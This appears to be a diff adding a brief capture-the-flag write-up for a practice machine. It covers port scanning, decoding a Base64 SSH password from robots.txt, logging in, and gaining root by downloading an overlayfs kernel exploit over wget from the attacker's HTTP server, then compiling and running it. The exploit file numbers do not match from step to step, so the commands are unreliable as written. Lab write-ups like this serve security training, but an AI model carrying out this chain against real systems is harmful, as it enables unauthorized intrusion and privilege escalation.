@@ -1,0 +1,49 @@
+Cyber sploit solution
+
+1st stage 
+   reconnaisance
+command used : nmap -sC -sV -p- $IP
+
+2nd step 
+	exploration at port 80
+	found robot.txt
+	content (maybe Base64 ) Y3liZXJzcGxvaXR7eW91dHViZS5jb20vYy9jeWJlcnNwbG9pdH0=
+	decoded ans : cybersploit{youtube.com/c/cybersploit} (maybe the flag) but this was ssh password
+on http port 80 source code viewed 
+<--------username : itsskv---------->
+logged into ssh 
+ssh itsskv@$IP 
+pass word cybersploit{youtube.com/c/cybersploit}
+found first flag in file local.txt
+
+2nd stage of exploit completes (Gaining access)
+
+3rd stage :
+privelige escalation 
+	based on victim os ie (ubuntu 12.04.5) overlays exploit 37297.c 
+      simple http server started at attacker
+	python -m simpleHttpserver 5000
+on victim machine
+	getting this exploit
+	wget http://tun0 (attackers Ip):5000/37292.txt
+ output :
+HTTP request sent, awaiting response... 200 OK
+Length: 5119 (5.0K) [text/plain]
+Saving to: `37292.c'
+
+100%[========================================================>] 5,119 
+
+ now Final stage of attack
+ run exploit 
+ gcc 37293.c -o expl
+ ./expl
+ now attacker has full control over machine
+ whoami
+ans : root
+	located finalflag.txt in root diretory
+	read it
+<MACHINE HACKED>
+
+	
+	  
+
